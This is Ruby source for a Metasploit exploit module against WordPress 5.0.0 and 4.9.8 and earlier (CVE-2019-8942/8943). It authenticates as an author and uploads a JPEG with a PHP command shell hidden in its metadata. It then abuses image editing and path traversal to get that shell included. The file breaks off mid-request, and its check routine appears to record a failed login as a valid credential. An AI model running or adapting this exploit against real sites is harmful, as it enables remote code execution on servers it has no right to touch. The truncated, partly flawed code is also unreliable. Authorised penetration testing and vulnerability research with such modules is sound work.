class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FileDropper
  include Msf::Exploit::Remote::HTTP::Wordpress

  def initialize(info = {})
    super(update_info(
      info,
      'Name'            => 'WordPress Crop-image Shell Upload',
      'Description'     => %q{
          This module exploits a path traversal and a local file inclusion
          vulnerability on WordPress versions 5.0.0 and <= 4.9.8.
          The crop-image function allows a user, with at least author privileges,
          to resize an image and perform a path traversal by changing the _wp_attached_file
          reference during the upload. The second part of the exploit will include
          this image in the current theme by changing the _wp_page_template attribute
          when creating a post.

          This exploit module only works for Unix-based systems currently.
      },
      'License'         => MSF_LICENSE,
      'Author'          =>
      [
        'RIPSTECH Technology',                               # Discovery
        'Wilfried Becard <wilfried.becard@synacktiv.com>'    # Metasploit module
      ],
    'References'      =>
      [
        [ 'CVE', '2019-8942' ],
        [ 'CVE', '2019-8943' ],
        [ 'URL', 'https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/']
      ],
      'DisclosureDate'  => 'Feb 19 2019',
      'Platform'        => 'php',
      'Arch'            => ARCH_PHP,
      'Targets'         => [['WordPress', {}]],
      'DefaultTarget'   => 0
    ))

    register_options(
      [
        OptString.new('USERNAME', [true, 'The WordPress username to authenticate with']),
        OptString.new('PASSWORD', [true, 'The WordPress password to authenticate with'])
      ])
  end

  def check
    cookie = wordpress_login(username, password)
    if cookie.nil?
      store_valid_credential(user: username, private: password, proof: cookie)
      return CheckCode::Safe
    end

    CheckCode::Appears
  end

  def username
    datastore['USERNAME']
  end

  def password
    datastore['PASSWORD']
  end

  def get_wpnonce(cookie)
    uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'media-new.php')
    res = send_request_cgi(
      'method'    => 'GET',
      'uri'       => uri,
      'cookie' => cookie
    )
    if res && res.code == 200 && res.body && !res.body.empty?
      res.get_hidden_inputs.first["_wpnonce"]
    end
  end

  def get_wpnonce2(image_id, cookie)
    uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'post.php')
    res = send_request_cgi(
      'method'    => 'GET',
      'uri'       => uri,
      'cookie'    => cookie,
      'vars_get'  => {
        'post'   => image_id,
        'action' => "edit"
      }
    )
    if res && res.code == 200 && res.body && !res.body.empty?
      tmp = res.get_hidden_inputs
      wpnonce2 = tmp[1].first[1]
    end
  end

  def get_current_theme
    uri = normalize_uri(datastore['TARGETURI'])
    res = send_request_cgi!(
      'method'    => 'GET',
      'uri'       => uri
    )
    fail_with(Failure::NotFound, 'Failed to access Wordpress page to retrieve theme.') unless res && res.code == 200 && res.body && !res.body.empty?

    theme = res.body.scan(/\/wp-content\/themes\/(\w+)\//).flatten.first
    fail_with(Failure::NotFound, 'Failed to retrieve theme') unless theme

    theme
  end

  def get_ajaxnonce(cookie)
    uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'admin-ajax.php')
    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => uri,
      'cookie' => cookie,
      'vars_post'  => {
        'action' => 'query-attachments',
        'post_id' => '0',
        'query[item]' => '43',
        'query[orderby]' => 'date',
        'query[order]' => 'DESC',
        'query[posts_per_page]' => '40',
        'query[paged]' => '1'
      }
    )
    fail_with(Failure::NotFound, 'Unable to reach page to retrieve the ajax nonce') unless res && res.code == 200 && res.body && !res.body.empty?
    a_nonce = res.body.scan(/"edit":"(\w+)"/).flatten.first
    fail_with(Failure::NotFound, 'Unable to retrieve the ajax nonce') unless a_nonce

    a_nonce
  end

  def upload_file(img_name, wp_nonce, cookie)
    img_data = %w[
      FF D8 FF E0 00 10 4A 46 49 46 00 01 01 01 00 60 00 60 00 00 FF ED 00 38 50 68 6F
      74 6F 73 68 6F 70 20 33 2E 30 00 38 42 49 4D 04 04 00 00 00 00 00 1C 1C 02 74 00
      10 3C 3F 3D 60 24 5F 47 45 54 5B 30 5D 60 3B 3F 3E 1C 02 00 00 02 00 04 FF FE 00
      3B 43 52 45 41 54 4F 52 3A 20 67 64 2D 6A 70 65 67 20 76 31 2E 30 20 28 75 73 69
      6E 67 20 49 4A 47 20 4A 50 45 47 20 76 38 30 29 2C 20 71 75 61 6C 69 74 79 20 3D
      20 38 32 0A FF DB 00 43 00 06 04 04 05 04 04 06 05 05 05 06 06 06 07 09 0E 09 09
      08 08 09 12 0D 0D 0A 0E 15 12 16 16 15 12 14 14 17 1A 21 1C 17 18 1F 19 14 14 1D
      27 1D 1F 22 23 25 25 25 16 1C 29 2C 28 24 2B 21 24 25 24 FF DB 00 43 01 06 06 06
      09 08 09 11 09 09 11 24 18 14 18 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24
      24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24
      24 24 24 24 24 24 24 FF C0 00 11 08 00 C0 01 06 03 01 22 00 02 11 01 03 11 01 FF
      C4 00 1F 00 00 01 05 01 01 01 01 01 01 00 00 00 00 00 00 00 00 01 02 03 04 05 06
      07 08 09 0A 0B FF C4 00 B5 10 00 02 01 03 03 02 04 03 05 05 04 04 00 00 01 7D 01
      02 03 00 04 11 05 12 21 31 41 06 13 51 61 07 22 71 14 32 81 91 A1 08 23 42 B1 C1
      15 52 D1 F0 24 33 62 72 82 09 0A 16 17 18 19 1A 25 26 27 28 29 2A 34 35 36 37 38
      39 3A 43 44 45 46 47 48 49 4A 53 54 55 56 57 58 59 5A 63 64 65 66 67 68 69 6A 73
      74 75 76 77 78 79 7A 83 84 85 86 87 88 89 8A 92 93 94 95 96 97 98 99 9A A2 A3 A4
      A5 A6 A7 A8 A9 AA B2 B3 B4 B5 B6 B7 B8 B9 BA C2 C3 C4 C5 C6 C7 C8 C9 CA D2 D3 D4
      D5 D6 D7 D8 D9 DA E1 E2 E3 E4 E5 E6 E7 E8 E9 EA F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FF
      C4 00 1F 01 00 03 01 01 01 01 01 01 01 01 01 00 00 00 00 00 00 01 02 03 04 05 06
      07 08 09 0A 0B FF C4 00 B5 11 00 02 01 02 04 04 03 04 07 05 04 04 00 01 02 77 00
      01 02 03 11 04 05 21 31 06 12 41 51 07 61 71 13 22 32 81 08 14 42 91 A1 B1 C1 09
      23 33 52 F0 15 62 72 D1 0A 16 24 34 E1 25 F1 17 18 19 1A 26 27 28 29 2A 35 36 37
      38 39 3A 43 44 45 46 47 48 49 4A 53 54 55 56 57 58 59 5A 63 64 65 66 67 68 69 6A
      73 74 75 76 77 78 79 7A 82 83 84 85 86 87 88 89 8A 92 93 94 95 96 97 98 99 9A A2
      A3 A4 A5 A6 A7 A8 A9 AA B2 B3 B4 B5 B6 B7 B8 B9 BA C2 C3 C4 C5 C6 C7 C8 C9 CA D2
      D3 D4 D5 D6 D7 D8 D9 DA E2 E3 E4 E5 E6 E7 E8 E9 EA F2 F3 F4 F5 F6 F7 F8 F9 FA FF
      DA 00 0C 03 01 00 02 11 03 11 00 3F 00 3C 3F 3D 60 24 5F 47 45 54 5B 30 5D 60 3B
      3F 3E
    ]
    img_data = [img_data.join].pack('H*')
    img_name += '.jpg'

    boundary = "#{rand_text_alphanumeric(rand(10) + 5)}"
    post_data = "--#{boundary}\r\n"
    post_data << "Content-Disposition: form-data; name=\"name\"\r\n"
    post_data << "\r\n#{img_name}\r\n"
    post_data << "--#{boundary}\r\n"
    post_data << "Content-Disposition: form-data; name=\"action\"\r\n"
    post_data << "\r\nupload-attachment\r\n"
    post_data << "--#{boundary}\r\n"
    post_data << "Content-Disposition: form-data; name=\"_wpnonce\"\r\n"
    post_data << "\r\n#{wp_nonce}\r\n"
    post_data << "--#{boundary}\r\n"
    post_data << "Content-Disposition: form-data; name=\"async-upload\"; filename=\"#{img_name}\"\r\n"
    post_data << "Content-Type: image/jpeg\r\n"
    post_data << "\r\n#{img_data}\r\n"
    post_data << "--#{boundary}--\r\n"
    print_status("Uploading payload")
    upload_uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'async-upload.php')

    res = send_request_cgi(
      'method'   => 'POST',
      'uri'      => upload_uri,
      'ctype'    => "multipart/form-data; boundary=#{boundary}",
      'data'     => post_data,
      'cookie'   => cookie
    )
    fail_with(Failure::UnexpectedReply, 'Unable to upload image') unless res && res.code == 200 && res.body && !res.body.empty?
    print_good("Image uploaded")
    res = JSON.parse(res.body)
    image_id = res["data"]["id"]
    update_nonce = res["data"]["nonces"]["update"]
    filename = res["data"]["filename"]
    return filename, image_id, update_nonce
  end

  def image_editor(img_name, ajax_nonce, image_id, cookie)
    uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'admin-ajax.php')
    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => uri,
      'cookie' => cookie,
      'vars_post'  => {
        'action' => 'image-editor',
        '_ajax_nonce' => ajax_nonce,
        'postid' => image_id,
        'history' => '[{"c":{"x":0,"y":0,"w":400,"h":300}}]',
        'target' => 'all',
        'context' => '',
        'do' => 'save'
      }
    )
    fail_with(Failure::NotFound, 'Unable to access page to retrieve filename') unless res && res.code == 200 && res.body && !res.body.empty?
    filename = res.body.scan(/(#{img_name}-\S+)-/).flatten.first
    fail_with(Failure::NotFound, 'Unable to retrieve file name') unless filename

    filename << '.jpg'
  end

  def change_path(wpnonce2, image_id, filename, current_date, path, cookie)
    uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'post.php')
    res = send_request_cgi(
      'method'   => 'POST',
      'uri'      => uri,
      'cookie' => cookie,
      'vars_post'  => {
        '_wpnonce' => wpnonce2,
        'action' => 'editpost',
        'post_ID' => image_id,
        'meta_input[_wp_attached_file]' => "#{current_date}#{filename}#{path}"
      }
    )
  end

  def crop_image(image_id, ajax_nonce, cookie)
    uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'admin-ajax.php')
    res = send_request_cgi(
      'method'   => 'POST',
      'uri'      => uri,
      'cookie' => cookie,
      'vars_post'  => {
        'action' => 'crop-image',
        '_ajax_nonce…
